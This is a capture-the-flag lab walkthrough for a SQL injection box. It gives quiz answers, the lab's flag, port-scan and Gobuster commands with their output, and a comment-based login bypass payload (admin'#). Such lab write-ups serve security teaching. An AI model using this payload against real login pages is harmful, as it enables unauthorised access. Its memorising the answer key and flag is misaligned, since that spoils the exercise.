# Tasks
- What does the acronym SQL stand for?
	- Structured Query Language
- What is one of the most common type of SQL vulnerabilities?
	- SQL injection
- What is the 2021 OWASP Top 10 classification for this vulnerability?
	- A03:2021-Injection
- What does Nmap report as the service and version that are running on port 80 of the target?
	- Apache httpd 2.4.38 ((Debian))
- What is the standard port used for the HTTPS protocol?
	- 443
- What is a folder called in web-application terminology?
	- directory
- What is the HTTP response code is given for 'Not Found' errors?
	- 404
- Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
	- dir
- What single character can be used to comment out the rest of a line in MySQL?
	- Hashtag symbol (  #  )
- If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
	- Congratulations
- Submit root flag
	- e3d0796d002a446c0e622226f42e9672


# Steps
- First, let's fire off a rustscan.
```
rustscan --ulimit 5000 --addresses "10.129.75.107" --top -- -sC -sV
```
- From the results, we are able to see that there is an Apache server running on the box.
```
PORT   STATE SERVICE REASON         VERSION  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))  
|_http-server-header: Apache/2.4.38 (Debian)  
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Login
```
- Getting onto the page, we are brought onto a login screen.
- Trying default credentials, I was not able to get through the page.
- I wonder if there is anything else, so we can run a gobuster instance to find some more stuff.
```
gobuster dir --url http://10.129.1.192 --wordlist `fzf-wordlists`
```
- Looks like there is more, but not really any other secret or not.
```
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/images               (Status: 301) [Size: 313] [--> http://10.129.1.192/images/]  
/css                  (Status: 301) [Size: 310] [--> http://10.129.1.192/css/]  
/js                   (Status: 301) [Size: 309] [--> http://10.129.1.192/js/]  
/vendor               (Status: 301) [Size: 313] [--> http://10.129.1.192/vendor/]  
/fonts                (Status: 301) [Size: 312] [--> http://10.129.1.192/fonts/]
```
- However, it's possible that we can do some SQL injection on the login page.
- And sure enough, when I use:
	- username: admin'#
	- password: password
- I was able to get the flag!
```
Congratulations!

  

Your flag is: e3d0796d002a446c0e622226f42e9672
```
